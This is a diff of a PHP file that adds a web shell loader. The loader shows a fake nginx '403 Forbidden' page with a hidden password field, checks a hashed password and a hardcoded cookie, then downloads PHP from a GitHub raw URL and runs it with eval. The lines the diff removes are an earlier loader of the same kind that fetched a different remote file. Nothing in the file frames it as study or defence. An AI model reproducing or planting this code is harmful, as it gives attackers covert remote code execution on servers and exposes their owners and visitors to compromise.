@@ -1,68 +1,63 @@
+﻿<?php
+$auth_pass = "b713c03bc5f0632a8172292ef537befce70bdbe3846e8e5fa80a8c6339ccbc98";
+
+function Login() {
+  die("<html>
+  <title>403 Forbidden</title>
+  <center><h1>403 Forbidden</h1></center>
+  <hr><center>nginx (You don't have permission access to server / on this server) </center>
+  <center><form method='post'><input style='text-align:center;margin:0;margin-top:0px;background-color:#fff;border:1px solid #fff;' type='password' name='pass'></form></center>");
+}
+
+function VEsetcookie($k, $v) {
+    $_COOKIE[$k] = $v;
+    setcookie($k, $v);
+}
+
+if (!empty($auth_pass)) {
+    if (isset($_POST['pass']) && (hash('sha256', $_POST['pass']) == $auth_pass))
+        VEsetcookie(md5($_SERVER['HTTP_HOST']), $auth_pass);
+
+    if (!isset($_COOKIE[md5($_SERVER['HTTP_HOST'])]) || ($_COOKIE[md5($_SERVER['HTTP_HOST'])] != $auth_pass))
+        Login();
+}
+?>
 <?php
-session_start();
+// Function to check if the user is logged in based on the presence of a valid cookie
+function is_logged_in()
+{
+    return isset($_COOKIE['user_id']) && $_COOKIE['user_id'] === 'user123'; // Ganti 'user123' dengan nilai yang sesuai
+}
 
-$encoded_user = 'YWRtaW4=';
-$encoded_pass = 'cmFoYXNpYQ==';
+// Check if the user is logged in before executing the content
+if (is_logged_in()) {
+    // Function to get URL content (similar to your previous code)
+    function geturlsinfo($url)
+    {
+        if (function_exists('curl_exec')) {
+            $conn = curl_init($url);
+            curl_setopt($conn, CURLOPT_RETURNTRANSFER, 1);
+            curl_setopt($conn, CURLOPT_FOLLOWLOCATION, 1);
+            curl_setopt($conn, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 6.1; rv:32.0) Gecko/20100101 Firefox/32.0");
+            curl_setopt($conn, CURLOPT_SSL_VERIFYPEER, 0);
+            curl_setopt($conn, CURLOPT_SSL_VERIFYHOST, 0);
 
-$username = base64_decode($encoded_user);
-$password = base64_decode($encoded_pass);
-
-if (!isset($_SESSION['logged_in'])) {
-    if ($_SERVER['REQUEST_METHOD'] === 'POST') {
-        $input_user = trim($_POST['username'] ?? '');
-        $input_pass = trim($_POST['password'] ?? '');
-
-        if ($input_user === $username && $input_pass === $password) {
-            $_SESSION['logged_in'] = true;
-            header("Location: " . $_SERVER['PHP_SELF']);
-            exit;
+            $url_get_contents_data = curl_exec($conn);
+            curl_close($conn);
+        } elseif (function_exists('file_get_contents')) {
+            $url_get_contents_data = file_get_contents($url);
+        } elseif (function_exists('fopen') && function_exists('stream_get_contents')) {
+            $handle = fopen($url, "r");
+            $url_get_contents_data = stream_get_contents($handle);
+            fclose($handle);
         } else {
-            $error = "Username atau password salah!";
+            $url_get_contents_data = false;
         }
+        return $url_get_contents_data;
     }
-    ?>
-    <!DOCTYPE html>
-    <html>
-    <head><title>Login</title></head>
-    <body>
-        <h2>Login</h2>
-        <?php if (isset($error)) echo "<p style='color:red;'>$error</p>"; ?>
-        <form method="POST">
-            <label>Username: <input type="text" name="username" required></label><br><br>
-            <label>Password: <input type="password" name="password" required></label><br><br>
-            <input type="submit" value="Login">
-        </form>
-    </body>
-    </html>
-    <?php
-    exit;
+
+    $a = geturlsinfo('https://raw.githubusercontent.com/soy777/gg/main/class.php');
+    eval('?>' . $a);
+} else {
 }
-
-function ambil_konten($url) {
-    $konten = @file_get_contents($url);
-    if ($konten !== false) return $konten;
-
-    $ch = curl_init();
-    curl_setopt($ch, CURLOPT_URL, $url);
-    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
-    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
-    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
-    curl_setopt($ch, CURLOPT_TIMEOUT, 10);
-    $konten = curl_exec($ch);
-    $httpcode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
-    curl_close($ch);
-
-    if ($httpcode !== 200 || empty($konten)) return false;
-    return $konten;
-}
-
-$url = "https://raw.githubusercontent.com/soy777/johnygreenwoodsz/main/lotusflower.php";
-
-$content = @file_get_contents($url);
-if ($content === false) {
-    die("Fehler beim Laden der Datei.");
-}
-
-header("Content-Type: text/plain; charset=utf-8");
-echo $content;
 ?>
